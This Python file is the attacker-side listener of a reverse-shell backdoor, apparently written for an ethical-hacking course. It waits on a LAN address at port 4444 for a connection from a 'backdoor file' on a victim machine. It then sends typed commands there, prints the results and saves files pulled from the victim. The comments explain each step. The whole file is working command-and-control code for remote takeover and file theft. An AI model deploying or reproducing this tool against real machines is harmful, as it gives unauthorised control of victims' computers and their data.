#!usr/bin/env python
import socket
import json
import base64
class Listener:
    def __init__(self, ip, port):#for initalisation of the connection between two machines
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#to reuse the local socket in TIME_WAIT state
        listener.bind((ip, port))#for server to get bind with the ip
        listener.listen(0)#number of connections.. here it's 1.
        print("[+] Waiting for incoming connection : ")#
        self.connection, address = listener.accept()#if found the self connection of backdoor file aceept it
        print("[+] Got a new connection, from " + str(address))#here the adress of the device will be printed where the backdoor file he running

    def reliable_send(self, data):
        json_data = json.dumps(data)#here dumps will first serialized the data objects, and make a file-like object where the bytes will be written.
        self.connection.send(json_data)#socket sending the data

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:  #this lets you test the block of code for errors
                json_data = json_data + self.connection.recv(1024)#recieves the data from the socket.
                return json.loads(json_data)#turning JSON encoded data into Python objects or decode the JSON to python
            except ValueError: #to handle the error when a user gives an invalid value to a function but is of a valid argument
                continue
    
    def execute_remotely(self, command):
        self.reliable_send(command) #calling function
        if command[0] == "exit":
            self.connection.close()#close a detached socket
            exit()
        return self.reliable_recieve()
    
    def write(self, path, content):
        with open(path, "wb") as file: #open the file (path, wb is for writing binary text file)
            file.write(base64.b64decode(content))#base64.b64decode methord is to decode the content to the file where we are writing
            return "[+] Download successful"

    def run(self):
        while True:
            command = input(">> ") #take the input and save to command
            command = command.split(" ") #split the command where spaces found
            result = self.execute_remotely(command) #terminates the local execution of the code and enqueues the task to the default queue, as specified in the command parameter.
            if(command[0] == "download"):
                result = self.write(command[1], result)
            print(result)

my_listener = Listener("192.168.150.1", 4444)
my_listener.run()